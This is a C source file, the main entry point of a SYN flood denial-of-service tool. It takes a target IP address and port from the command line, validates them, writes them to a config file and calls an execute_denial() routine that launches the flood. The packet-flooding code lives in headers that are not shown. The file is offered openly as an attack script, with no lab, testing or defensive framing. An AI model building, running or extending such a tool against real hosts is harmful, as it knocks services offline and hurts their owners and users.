/**
 * @file main.c
 * @author TheRedCowboy
 * @brief Main entry point for the SYN Flood attack script. This file handles command-line argument parsing, 
 * input validation, and initiates the execution of the SYN Flood attack by calling the appropriate functions from the main_lib 
 * and flood_core modules. The script allows users to specify the target IP address and port for the attack, 
 * with default values if no arguments are provided. 
 * It also includes error handling for invalid input formats and provides feedback on the execution status of the attack.
 * 
 * @version 1.0
 * @date 2026-03-02
 * 
 * @copyright Copyright (c) 2026
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>
#include "lib/main_lib.h"
#include "lib/flood_core.h"
#include "lib/error_handler.h"

int main(int argc,char* argv[]){
    char s;

    switch(argc){ // Handle command-line arguments based on the number of arguments provided. The script expects a maximum of 3 arguments (the program name, destination IP, and destination port). 
                    // Depending on the number of arguments, the script will either use default values or validate the provided input and update the configuration accordingly.
        case 1:
            fprintf(stdout,"\033[33m \n\t Warning : No arguments. \n\t Default arguments: \n\t\t -dest_ip: 0.0.0.0 \n\t\t -dest_port: 80\033[0m\n\n Do you wish to continue? [Y]=yes [N]=no [I]=more infos\n\nc: ");
            scanf("%c",&s);

            if(s == 'N' || s=='n'){
                fprintf(stderr,"\033[31m \n\t Error [0x%d] : aborted\033[0m\n",ERR_ABORTED);
                return -1;
            }else if(s=='I' || s=='i'){
                return -1;
            }  
            break;
        case 2:
            if(!check_ip_octet(argv[1])){ // Validate the provided IP address using the check_ip_octet function. If the IP address is valid, update the configuration with the provided IP and use the default port (80). If the IP address is invalid, print an error message and return an error code.
                    fprintf(stdout,"\033[32m \n\t Info : Only IP Specified [value= %s] \n\t Default argument: -dest_port: 80\033[0m\n",argv[1]);
                    update_ini_key("../config/config.ini","dest_ip",argv[1]);
            }else{
                    fprintf(stderr,"\033[31m \n\t Error [0x%d] : Wrong IP format.\n\t Try a valid format like x.x.x.x (max 255 for octect) [your value]= %s\033[0m\n",ERR_WRONG_IP_FORMAT,argv[1]);
                    return -1;
            }
            break;
        case 3:
            if(check_ip_octet(argv[1])){ // Validate the provided IP address using the check_ip_octet function. If the IP address is valid, proceed to validate the port number. If the IP address is invalid, print an error message and return an error code.
                    fprintf(stderr,"\033[31m \n\t Error [0x%d] : Wrong IP format.\n\t Try a valid format like x.x.x.x (max 255 for octect) [your value]= %s\033[0m\n",ERR_WRONG_IP_FORMAT,argv[1]);
                    return -1;
            }
            if(check_port(atoi(argv[2]))){ // Validate the provided port number using the check_port function. If the port number is valid, update the configuration with the provided IP and port. If the port number is invalid, print an error message and return an error code.
                    fprintf(stderr,"\033[31m \n\t Error [0x%d] : Wrong Port format.\n\t The value must be between 1 and 65535  [your value]= %s\033[0m\n",ERR_WRONG_PORT_FORMAT,argv[2]);
                    return -1;
            }
            else{
                    /* Fill the configuration file with the provided arguments */
                    update_ini_key("../config/config.ini","dest_ip",argv[1]);
                    update_ini_key("../config/config.ini","dest_port",argv[2]);

                    printf("\n\t \033[32m [+] Configuration Setted");
                    printf("\n\t\t \033[34m[-] Dest Port : %d \n\t\t [-] Dest IP : %s",atoi(argv[2]),argv[1]);
            }
            break;
        default:
            fprintf(stderr,"\033[31m \n\t Error [0x%d] : Too many arguments. Expected max 3 arguments \n\n \t Type synfld -h for more infos\033[0m\n",ERR_TOO_MANY_ARGS);
            return -1;
    }

    
    execute_denial();
    
    return 0;
    
}


